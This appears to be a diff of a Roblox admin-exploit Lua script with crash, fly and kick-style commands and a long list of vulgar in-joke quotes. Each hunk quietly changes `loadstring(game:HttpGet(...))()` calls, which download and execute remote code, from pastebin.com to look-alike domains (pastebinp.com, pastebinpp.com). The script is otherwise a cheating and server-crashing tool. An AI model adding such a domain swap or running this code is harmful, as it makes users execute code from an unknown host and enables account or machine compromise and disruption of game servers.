@@ -69,7 +69,7 @@ local crashall_Text = "                                                         
 
 Quotes = {"i completely cleared a khols admin server","What every tool in AdminJoy looks like when doing the command ;alltools","ayyyyy i have the owner of admin joy","he is my friend","ClassicClient-source","DDOSER-APRIL2-PATCH.exe","FastColoredTextBox.dll","Best MCPE hack IS shortcut :D","Powered by muffins","gg ez kid","Use the force bitch, Use the force.","I hope you've had a nice start to the week.","raw/d7eTDKbJ","Burned bitch!","ow they dont know u?","bitch","heart","my","steal","Fuck you -Ex_zivye(NOT REALLY)","you can also get private info via exif","i hope u didnt add for clearlogs I word cuz ill hate u",";kill all, What why no work?!?!?!?!",";fly plzz",":shrek me",":admin me",":fly","\"Commands\"","yo mama xd","Hi! So, you know on ragdoll, I wanna do that baloon thing, do you know how-",";fly","you okay? also, im here to help. if you need help, tell me!","no joke tho- im here to help you if you need help-","Remove the l from clock-","viewing logs I see","aDmIn mE", "Hey bitch~","Shortcuts the best MC hack","Fortnite sucks.","Only I can clearlogs","Adminjoy users aren't bright","Do Win+X for perm!","IM GAMERBOY80!","nice bobs","What are you doing step bro!","local dick = \"NONE\"","May i put my token next to yours...","Among.Us.v2020.11.17s","i have a working kick script","Yo anyone","omg nooooo!!!!","PEE","this will be a roblox id in less then 3 days","Subway Sexist - Subway Surfers Rap"," German SpongeBob [EARRAPE] ","Why do i get more suggestions from shortcuts general then its suggestions channel...","can someone tell me a free excuter i can use?","[Content Deleted]","#### YOU #####","Laamy we in da same server what a goat","what is #other-scripts for","wearedevs.net = VIRUS","Im bored, learn lua.","function ChangeColour(Part, Colour)","omg11!!1","the only differents is when he sees me he stands there tripping me ;-;","i met admin joy wner too!1 !11","easyexploits.dll","yes heres so not virus.exe [FILE.txt]","OMG YOU ARE HACKER?1?11/!?/1/!?","Make anti-tp (Im trying)","Took me all fucking day to get this shit","Whats that step br- WHAT!","HACOR!?!?!??!!??","laamy is hacer","i dont think wkick works","[Laggy Text Here]","i-, wdym????"}
 
-loadstring(game:HttpGet("https://pastebin.com/raw/iqb45GrA"))()
+loadstring(game:HttpGet("https://pastebinp.com/raw/iqb45GrA"))()
 
 local crashall = false
 local teskking = false
@@ -159,7 +159,7 @@ mousee.KeyDown:connect(function(key)
 		game.Players:Chat("ff me")
 	end
 	if key:lower() == gravity_keybind then
-		loadstring(game:HttpGet("https://pastebin.com/raw/geUZHr7B"))()
+		loadstring(game:HttpGet("https://pastebinp.com/raw/geUZHr7B"))()
 	end
 	if key:lower() == fly_keybind then
 		game.Players:Chat("fly me")
@@ -609,7 +609,7 @@ Players.LocalPlayer.Chatted:Connect(function(msg)
 	end
 	
 	if string.sub(msg:lower(), 0, 4) == prefix.."fps" then
-		loadstring(game:HttpGet("https://pastebin.com/0LJ9htbC"))()
+		loadstring(game:HttpGet("https://pastebinp.com/0LJ9htbC"))()
 	end
 	
 	if string.sub(msg:lower(), 0, 6) == prefix.."crash" then
@@ -1849,7 +1849,7 @@ Players.LocalPlayer.Chatted:Connect(function(msg)
 		print("antivoid"..tostring(antivoid))
 		print("")
 	end
-	-- loadstring(game:HttpGet("https://pastebin.com/raw/BnccXAFV", true))()
+	-- loadstring(game:HttpGet("https://pastebinpp.com/raw/BnccXAFV", true))()
 end)
 
 function regen()
